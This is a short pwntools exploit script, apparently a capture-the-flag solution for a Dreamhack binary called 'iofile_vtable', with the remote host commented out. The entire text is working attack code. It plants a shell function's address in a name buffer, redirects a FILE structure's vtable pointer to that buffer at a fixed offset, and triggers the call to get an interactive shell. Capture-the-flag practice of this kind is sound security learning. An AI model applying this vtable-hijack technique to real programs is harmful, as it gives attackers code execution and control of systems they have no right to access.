from pwn import *

p = process('./iofile_vtable')
#p = remote('host3.dreamhack.games', 15690)
shell = 0x40094a
name  = 0x6010d0 - 0x38
p.sendlineafter(b"name: ", p64(shell))
p.sendlineafter(b">", b"4")
p.sendlineafter(b"change: ", p64(name))
p.sendlineafter(b">", b"2")

p.interactive()